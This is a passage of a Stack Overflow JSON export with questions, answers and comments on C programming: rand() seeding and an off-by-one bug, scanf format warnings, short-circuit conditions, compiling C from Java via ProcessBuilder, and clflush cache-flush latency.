"user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 1, "last_activity_date": 1457553919, "last_edit_date": 1495540228, "creation_date": 1457552909, "answer_id": 35901245, "question_id": 35901172, "link": "https://stackoverflow.com/questions/35901172/how-to-clear-the-memory-in-c/35901245#35901245", "title": "How to clear the memory in C?", "body": "<p>First of all, for an allocation like</p>\n\n<pre><code>c=(char*) calloc(len1,sizeof(char));\n</code></pre>\n\n<p>later, using</p>\n\n<pre><code>c[len1]='\\0';\n</code></pre>\n\n<p>is accessing out of bound memory. It invokes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behavior</a>.</p>\n\n<p>To elaborate, C uses 0-based indexing, so, by saying </p>\n\n<pre><code> c[len1]='\\0';\n</code></pre>\n\n<p>you're going <a href=\"https://en.wikipedia.org/wiki/Off-by-one_error\" rel=\"nofollow noreferrer\">off-by-one</a>.</p>\n\n<p>Then, you should call the PNRG seeder function <code>srand()</code> only once, possibly at <code>main()</code>. Otherwise, <code>time()</code> having a granularity of 1 second, it will seed the PNRG with same value which in turn will cause the <code>rand()</code> to produce the same set of <em>random</em> numbers again.</p>\n\n<p>That said,</p>\n\n<ol>\n<li><p><a href=\"https://stackoverflow.com/q/605845/2173917\">Please see this discussion on why not to cast the return value of <code>malloc()</code> and family in <code>C</code>.</a>.</p></li>\n<li><p><code>sizeof(char)</code> is guaranteed to be 1 in C. </p></li>\n</ol>\n\n<p>A better and robust way of writing the allocation statement will be</p>\n\n<pre><code>c =  calloc( len1, sizeof*c );     \n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 67, "user_id": 5019132, "user_type": "registered", "accept_rate": 14, "profile_image": "https://lh6.googleusercontent.com/-ICkbIbT815g/AAAAAAAAAAI/AAAAAAAABjk/MRATF9kyr-I/photo.jpg?sz=128", "display_name": "Ashutosh Dalai", "link": "https://stackoverflow.com/users/5019132/ashutosh-dalai"}, "edited": false, "score": 0, "creation_date": 1457555600, "post_id": 35901420, "comment_id": 59464410, "body": "if i remove srand function,so will it give correct output?"}, {"owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "reply_to_user": {"reputation": 67, "user_id": 5019132, "user_type": "registered", "accept_rate": 14, "profile_image": "https://lh6.googleusercontent.com/-ICkbIbT815g/AAAAAAAAAAI/AAAAAAAABjk/MRATF9kyr-I/photo.jpg?sz=128", "display_name": "Ashutosh Dalai", "link": "https://stackoverflow.com/users/5019132/ashutosh-dalai"}, "edited": false, "score": 0, "creation_date": 1457559246, "post_id": 35901420, "comment_id": 59466500, "body": "If you remove <code>srand</code> completely, the random number generator will be seeded with 0.  So it will give &quot;correct&quot; output, but will give the same output every time you run the program.  Putting the <code>srand</code> call in <code>main</code> will result in different output each time you run the program (assuming the clock ticks at least one second between runs)"}], "tags": [], "owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "is_accepted": false, "score": 4, "last_activity_date": 1457553499, "creation_date": 1457553499, "answer_id": 35901420, "question_id": 35901172, "link": "https://stackoverflow.com/questions/35901172/how-to-clear-the-memory-in-c/35901420#35901420", "title": "How to clear the memory in C?", "body": "<p>The function <code>srand</code> sets the random seed, and if you call it again with the same random seed, it will cause future random calls to return a repeat of the same sequence. So when you call:</p>\n\n<pre><code>srand((unsigned) time(&amp;t));\n</code></pre>\n\n<p>it resets the random seed to the wall clock time in <em>seconds</em>.  Which means if you call it again after less than a second has elapsed (as you do in your code), it probably resets the seed to the same value, causing you to get the same random string again.</p>\n\n<p>You should only call <code>srand</code> <em>once</em>, at the start of your program in main, before calling any other function that calls <code>rand</code></p>\n"}], "owner": {"reputation": 67, "user_id": 5019132, "user_type": "registered", "accept_rate": 14, "profile_image": "https://lh6.googleusercontent.com/-ICkbIbT815g/AAAAAAAAAAI/AAAAAAAABjk/MRATF9kyr-I/photo.jpg?sz=128", "display_name": "Ashutosh Dalai", "link": "https://stackoverflow.com/users/5019132/ashutosh-dalai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 678, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1457556829, "creation_date": 1457552652, "last_edit_date": 1457556829, "question_id": 35901172, "link": "https://stackoverflow.com/questions/35901172/how-to-clear-the-memory-in-c", "title": "How to clear the memory in C?", "body": "<p>I have written a program to generate a random string,\nbut when i am calling the function for two/more times,i am getting same random strings.</p>\n\n<p>Please check the code below:</p>\n\n<pre><code>#include &lt;string.h&gt;\n#include &lt;time.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nchar* randomstring(int length);\n\nint main()\n{\n   char* randomstring(int);\n   char *str, *str2;\n   str = randomstring(3);\n   str2 = randomstring(3);\n   printf(\"final random string is %s and length is %s\\n\", str, str2);\n}\n\nchar* randomstring(int length)\n{\n   int len, len1, i = 0, j = 0;\n   char *c;\n   char *string = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n   len = strlen(string);\n   len1 = length + 1;\n   time_t t;\n   c=(char*) calloc(len1, sizeof(char));\n   printf(\"final random string is %d \\n\", len);\n   srand((unsigned) time(&amp;t));\n   for(i = 0; i &lt; length; i++)\n   {\n      j=rand() % len;\n      c[i] = string[j];\n   }\n   c[len1] = '\\0';\n   return c;\n}\n</code></pre>\n\n<p>Output : </p>\n\n<pre><code>final random string is 26 \nfinal random string is 26 \nfinal random string is BNQ and length is BNQ\n</code></pre>\n"}, {"tags": ["c", "file", "io", "scanf"], "comments": [{"owner": {"reputation": 6181, "user_id": 3322533, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/cbbd1b40887d19bc0c8fdd5ef42a05ed?s=128&d=identicon&r=PG", "display_name": "User1291", "link": "https://stackoverflow.com/users/3322533/user1291"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457552197, "post_id": 35900935, "comment_id": 59462423, "body": "@EugeneSh. Unless I mistyped something, you should see exactly one <code>%lf</code>, the others should be <code>%*lf</code>and therefore ignored."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457552236, "post_id": 35900935, "comment_id": 59462445, "body": "Yeah, sorry. Misread"}], "answers": [{"comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 0, "creation_date": 1590623215, "post_id": 35901136, "comment_id": 109753108, "body": "Learn something new every day.  :)"}], "tags": [], "owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "is_accepted": true, "score": 12, "last_activity_date": 1457552542, "creation_date": 1457552542, "answer_id": 35901136, "question_id": 35900935, "link": "https://stackoverflow.com/questions/35900935/c-reading-a-specific-column-in-data-file/35901136#35901136", "title": "c - reading a specific column in data file", "body": "<p>The length specifier (namely <code>l</code> in <code>lf</code>) in the format string is intended to indicate the size of the receiving parameter in case it is assigned, while <code>f</code> tells how the input should look like. It means that specifying the length for the fields which are suppressed is meaningless, and your compiler is just trying to make sure you haven't mistakenly typed <code>*</code> instead of <code>%</code>. Just remove the <code>l</code> from the suppressed fields.</p>\n"}], "owner": {"reputation": 6181, "user_id": 3322533, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/cbbd1b40887d19bc0c8fdd5ef42a05ed?s=128&d=identicon&r=PG", "display_name": "User1291", "link": "https://stackoverflow.com/users/3322533/user1291"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1961, "favorite_count": 2, "accepted_answer_id": 35901136, "answer_count": 1, "score": 7, "last_activity_date": 1457552542, "creation_date": 1457551956, "question_id": 35900935, "link": "https://stackoverflow.com/questions/35900935/c-reading-a-specific-column-in-data-file", "title": "c - reading a specific column in data file", "body": "<p>So I created a data file like so:</p>\n\n<pre><code>for(size_t n = ...;...;...){\n    //do some stuff\n    double mean_value = ...\n    double min_value = ...\n    double max_value = ...\n\n    FILE *fp = fopen(OUTPUT_FILE,\"a+\");\n    fprintf(fp,\"%d %lf %lf %lf\\n\",n,mean_value, min_value, max_value);\n    fclose(fp);\n}\n</code></pre>\n\n<p>And now i want to read the <code>mean_value</code>s that I've written...</p>\n\n<pre><code>FILE *fp = fopen(OUTPUT_FILE,\"a+\");\ndouble *means = malloc(...);\nfor(size_t i = 0; ...; ...){\n    fscanf(fp,\"%*d %lf %*lf %*lf\\n\", &amp;means[i]);\n}\n//more stuff\nfprintf(fp,...);\nfclose(fp);\n</code></pre>\n\n<p>And gcc complains about that:</p>\n\n<blockquote>\n  <p>warning: use of assignment suppression and length modifier together in gnu_scanf format [-Wformat=]</p>\n  \n  <p>fscanf(fp,\"%*d %lf %*lf %*lf\\n\", &amp;means[i]);</p>\n\n<pre><code>         ^\n</code></pre>\n</blockquote>\n\n<p>And I'm not sure what it's trying to tell me, here.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 209335, "user_id": 661519, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/1735ab1c8ba4229daa855ec6aad03065?s=128&d=identicon&r=PG", "display_name": "juanchopanza", "link": "https://stackoverflow.com/users/661519/juanchopanza"}, "edited": false, "score": 2, "creation_date": 1457551771, "post_id": 35900838, "comment_id": 59462169, "body": "Those are some pretty poor guidelines. Anyway, does the code you showed capture the desired logic?"}, {"owner": {"reputation": 472, "user_id": 3625816, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d0bd2b3bb7a0339ad774d752b35ef90e?s=128&d=identicon&r=PG&f=1", "display_name": "Filkolev", "link": "https://stackoverflow.com/users/3625816/filkolev"}, "edited": false, "score": 1, "creation_date": 1457551866, "post_id": 35900838, "comment_id": 59462221, "body": "Why not use a regular &amp;&amp;? It is short-circuited, so it will immediately exit if the pointer is NULL."}, {"owner": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 0, "creation_date": 1457551904, "post_id": 35900838, "comment_id": 59462250, "body": "I just gave some example code! I wanted some functionality like in ADA we have short circuits: AND THEN / OR THEN"}, {"owner": {"reputation": 163028, "user_id": 477878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qounX.jpg?s=128&g=1", "display_name": "Joachim Isaksson", "link": "https://stackoverflow.com/users/477878/joachim-isaksson"}, "edited": false, "score": 0, "creation_date": 1457552095, "post_id": 35900838, "comment_id": 59462362, "body": "<code>if ( NULL == params || cJSON_Int != params-&gt;valueInt)</code> will shortcut. <code>&amp;&amp;</code> and <code>||</code> will have the right side evaluated only if strictly necessary."}, {"owner": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 0, "creation_date": 1457590992, "post_id": 35900838, "comment_id": 59477522, "body": "Thanks for the criticism!"}, {"owner": {"reputation": 30517, "user_id": 774499, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/sju2a.jpg?s=128&g=1", "display_name": "David Hammen", "link": "https://stackoverflow.com/users/774499/david-hammen"}, "edited": false, "score": 1, "creation_date": 1458047013, "post_id": 35900838, "comment_id": 59675521, "body": "This isn&#39;t surprising. I&#39;ve found that organizations that ban <code>if (params == NULL)</code> in favor of yoda conditions such as <code>if (NULL == params)</code> also tend to ban the ternary operator. And vice versa. That said, there&#39;s no need for a ternary here. Use the fact that <code>&amp;&amp;</code> and <code>||</code> shortcut. The code is cleaner, shorter, and more obvious than the equivalent ternary."}], "answers": [{"comments": [{"owner": {"reputation": 163028, "user_id": 477878, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/qounX.jpg?s=128&g=1", "display_name": "Joachim Isaksson", "link": "https://stackoverflow.com/users/477878/joachim-isaksson"}, "edited": false, "score": 0, "creation_date": 1457551949, "post_id": 35900903, "comment_id": 59462280, "body": "His original code will enter &quot;Do something&quot; in case NULL == params."}, {"owner": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 0, "creation_date": 1457552776, "post_id": 35900903, "comment_id": 59462741, "body": "Thanks, this is what I wanted!"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 0, "creation_date": 1457553026, "post_id": 35900903, "comment_id": 59462910, "body": "@AbhishekKumar Glad I could help.  Feel free to <a href=\"http://stackoverflow.com/help/accepted-answer\">accept this answer</a> if you found it useful."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1457553518, "post_id": 35900903, "comment_id": 59463191, "body": "&quot;<i>To better reflect the logic you have</i>&quot; :-)"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 2, "last_activity_date": 1458046083, "last_edit_date": 1458046083, "creation_date": 1457551834, "answer_id": 35900903, "question_id": 35900838, "link": "https://stackoverflow.com/questions/35900838/replacement-for-ternary-operator/35900903#35900903", "title": "Replacement for ternary operator", "body": "<p>The logical OR operator is a short-circuit operator, meaning it won't evaluate the right operand if it can determine the final result of the expression from the left operand.</p>\n\n<p>So you can do this:</p>\n\n<pre><code>if ((NULL == params) || (cJSON_Int != params-&gt;valueInt))\n{\n    ...\n}\n</code></pre>\n\n<p>This will enter the <code>if</code> block if <code>params</code> is NULL OR the second condition is true.  The second part won't be evaluated if <code>NULL == params</code> evaluates to true.</p>\n"}, {"comments": [{"owner": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "edited": false, "score": 0, "creation_date": 1457552475, "post_id": 35900980, "comment_id": 59462568, "body": "Yes, this is what I thought of using but I didn&#39;t want my code to look this big. I wanted one line logic. Anyway Thanks"}], "tags": [], "owner": {"reputation": 51553, "user_id": 557306, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/OAmpG.jpg?s=128&g=1", "display_name": "sidyll", "link": "https://stackoverflow.com/users/557306/sidyll"}, "is_accepted": false, "score": 1, "last_activity_date": 1457552091, "creation_date": 1457552091, "answer_id": 35900980, "question_id": 35900838, "link": "https://stackoverflow.com/questions/35900838/replacement-for-ternary-operator/35900980#35900980", "title": "Replacement for ternary operator", "body": "<p>I find it easier (and more readable) to use the explicit cases in a branch:</p>\n\n<pre><code>if (params == NULL) {\n    // Do something\n} else {\n    // It is not NULL, check value\n    if (cJSON_Int != params-&gt;valueInt) {\n        // value is not cJSON_Int\n    } else {\n        // optional else\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 946, "user_id": 5405191, "user_type": "registered", "accept_rate": 64, "profile_image": "https://lh5.googleusercontent.com/-4P9RvEs8-eM/AAAAAAAAAAI/AAAAAAAAAA4/sRL7T9ciO7U/photo.jpg?sz=128", "display_name": "Akay", "link": "https://stackoverflow.com/users/5405191/akay"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 130, "favorite_count": 0, "answer_count": 2, "score": -3, "last_activity_date": 1458046083, "creation_date": 1457551621, "question_id": 35900838, "link": "https://stackoverflow.com/questions/35900838/replacement-for-ternary-operator", "title": "Replacement for ternary operator", "body": "<p>Let <strong>params</strong> be a pointer to a structure which contains a member <strong>valueInt</strong>. I want to check the value of <strong>valueInt</strong> in the pointed structure but only after checking if the pointer is not a NULL. So I tried conditional operator like:</p>\n\n<pre><code>if ((NULL == params) ? 1: (cJSON_Int != params-&gt;valueInt)) \n{\n // Do Something\n}\n</code></pre>\n\n<p>My requirement is to check the pointer NULL equivalency first and then dereference it. But I am not supposed to use ternary operator according to our company guidelines. What are other ways in place of the conditional statement that I can use here (something like short-circuit statements)?</p>\n"}, {"tags": ["java", "c", "gcc", "compilation"], "answers": [{"tags": [], "owner": {"reputation": 1059, "user_id": 5734097, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CGDH8.png?s=128&g=1", "display_name": "D.Kastier", "link": "https://stackoverflow.com/users/5734097/d-kastier"}, "is_accepted": true, "score": 1, "last_activity_date": 1457553462, "creation_date": 1457553462, "answer_id": 35901407, "question_id": 35900749, "link": "https://stackoverflow.com/questions/35900749/compiling-a-c-source-through-javacode-using-gcc/35901407#35901407", "title": "Compiling a C Source through javacode using gcc", "body": "<p>Use <code>ProcessBuilder</code> to make this easier. </p>\n\n<p>This should work on Windows (at the moment, I only have Linux here).</p>\n\n<pre><code>String directory = \"D:\\\\Soft\\\\WebApplication\\\\build\\\\web\\\\code\\\\\";\nString[] commands = {\"cmd\", \"/C\", \"gcc\", \"Demo.c\", \"-o\", \"Demo.exe\"};\n\nProcessBuilder pb = new ProcessBuilder();\npb.directory(new File(directory));\npb.command(commands);\n\nProcess p = pb.start();\n\n// process in/out streams\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 6041310, "user_type": "registered", "profile_image": "https://graph.facebook.com/1044869412253571/picture?type=large", "display_name": "Shubham Gupta", "link": "https://stackoverflow.com/users/6041310/shubham-gupta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "accepted_answer_id": 35901407, "answer_count": 1, "score": -1, "last_activity_date": 1535380229, "creation_date": 1457551363, "last_edit_date": 1535380229, "question_id": 35900749, "link": "https://stackoverflow.com/questions/35900749/compiling-a-c-source-through-javacode-using-gcc", "title": "Compiling a C Source through javacode using gcc", "body": "<p>I am trying to compile c file through java code using exec method</p>\n\n<pre><code>String inputFilePath = \"\\\"D:\\\\Soft\\\\WebApplication\\\\build\\\\web\\\\code\\\\Demo.c\\\"\";\nString[] commands = {\"cmd\", \"/c\", \"gcc\",inputFilePath,\"-o\",\"Demo\"};\nProcess p=Runtime.getRuntime().exec(commands);\nDataInputStream din=new DataInputStream(p.getErrorStream());\nString s=\"\",temp;\nwhile((temp=din.readLine())!=null)\n      s+=temp;\n      if(s.equals(\"\")){\n         cf.setResult(\"No Syntax Error\");\n      }\n      else\n        cf.setResult(s);\n</code></pre>\n\n<p>but it is not generating <code>demo.exe</code> file</p>\n"}, {"tags": ["c", "linux-kernel", "intel", "cpu-architecture", "cpu-cache"], "comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 1, "creation_date": 1457565983, "post_id": 35900401, "comment_id": 59469733, "body": "Unfortunately Agner Fog didn&#39;t test <code>clflush</code> for his instruction tables.  Presumably it has a significant cost in uops or a limited throughput even when there&#39;s nothing to actually do.  You should look at perf counters (with <code>perf</code>).  ocperf.py is a nice wrapper around <code>perf</code>, which adds symbolic names for uop counters."}, {"owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457577152, "post_id": 35900401, "comment_id": 59473251, "body": "@PeterCordes, however, why the latency increases when there is nothing to do? I&#39;m posting the code by editing the question, and hopefully, it may show some issues inside?"}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457581911, "post_id": 35900401, "comment_id": 59474473, "body": "I don&#39;t have any ideas about the performance yet, but I from looking at the code, you could have used <code>_mm_clflush(void const *p)</code> from <code>immintrin.h</code> to emit a clflush.  Or used <code>volatile char*cp = p; asm volatile (&quot;clflush %0&quot; :: &quot;m&quot;(*cp));</code> <a href=\"http://goo.gl/0E2Y6c\" rel=\"nofollow noreferrer\">to let the compiler use whatever addressing mode it wants</a>.  That also avoids breakage if you compile with <code>-masm=intel</code>.  Linux <a href=\"http://lxr.free-electrons.com/source/arch/x86/include/asm/special_insns.h#L196\" rel=\"nofollow noreferrer\">does it this way, but with the operand as a read-write output operand</a>."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 1, "creation_date": 1457582252, "post_id": 35900401, "comment_id": 59474580, "body": "I see Linux&#39;s in-kernel <code>clflush_cache_range</code> is optimized for Skylake, and <a href=\"http://lxr.free-electrons.com/source/arch/x86/mm/pageattr.c#L130\" rel=\"nofollow noreferrer\">includes a memory barrier before/after the clflush loop</a>, because it uses a function which it hot-patched to <code>clflushopt</code> instead of <code>clflush</code> if the CPU supports <code>clflushopt</code>.  Memory barriers aren&#39;t free, perhaps some of the cost you&#39;re seeing is from this?  I guess you got similar results with user-space, too, though.  If so, cost of memory barriers doesn&#39;t explain it, since you don&#39;t use <code>MFENCE</code> in your user-space version."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457582967, "post_id": 35900401, "comment_id": 59474777, "body": "BTW, why do you want this?  If you expect that most of cache should be flushed, you could use <code>wbinvd</code> (although that&#39;s a privileged instruction).  It would be interesting to compare.  I was going to test this with perf counters on my Sandybridge machine, but the source you posted doesn&#39;t compile.  I stuck it on <a href=\"http://goo.gl/SMRXMU\" rel=\"nofollow noreferrer\">godbolt with the user-space version uncommented, and -Werror to flag missing function definitions</a>, and got tons of compile errors.  Since you have a working version, I&#39;ll just wait for you to post it."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457583145, "post_id": 35900401, "comment_id": 59474820, "body": "Are you testing on a virtualized system, or is Linux running on the bare metal?  And what hardware: Haswell Xeon?  You should add that to the question, since right now it&#39;s just in a comment on Leeor&#39;s answer."}, {"owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457584286, "post_id": 35900401, "comment_id": 59475153, "body": "@PeterCordes, I&#39;m running on bare metal. It&#39;s Haswell Xeon 2618L v3 processor. The CLFLUSH size is 64B according to /proc/cpuinfo. I&#39;m creating a repo to hold all code to conduct the exp."}, {"owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457586039, "post_id": 35900401, "comment_id": 59475641, "body": "@PeterCordes, I created a repo to hold all of the code that needed to run the expeirment. The repo is at <a href=\"https://bitbucket.org/pennpanda/clflush\" rel=\"nofollow noreferrer\">bitbucket.org/pennpanda/clflush</a> . You may need to compile the kernel and boot into the customized kernel before you run the ca_spin.c userspace program. I really appreciate your help! Tomorrow, we will also try to use clflush only to flush the cache and avoid the MFENCE to see if it solve the mystery..."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457586480, "post_id": 35900401, "comment_id": 59475791, "body": "I&#39;ll probably just test running <code>clflush</code> from userspace.  It&#39;s easier to profile that way, and it&#39;s easy to do it on the whole array.  It removes a whole layer of complication, if we&#39;re not trying to flush the process&#39;s code, too.  I&#39;m not sure how the TLB works in syscall context.  Does the kernel use the same page tables as userspace to access user memory?  My wild guess is &quot;yes&quot;, but if not, doing it in-kernel will generate extra TLB misses."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457586591, "post_id": 35900401, "comment_id": 59475828, "body": "Your repo isn&#39;t public.  Even after signing up and agreeing to let bitbucket see my email address and profile info, it said: &quot;You do not have access to this repository.&quot;  github is the usual choice for free repos, because it doesn&#39;t require anyone to sign up before doing a checkout."}, {"owner": {"reputation": 1521, "user_id": 2529428, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/af43d408087779aef4bbeb2d00736bce?s=128&d=identicon&r=PG", "display_name": "Mike", "link": "https://stackoverflow.com/users/2529428/mike"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1457624340, "post_id": 35900401, "comment_id": 59500094, "body": 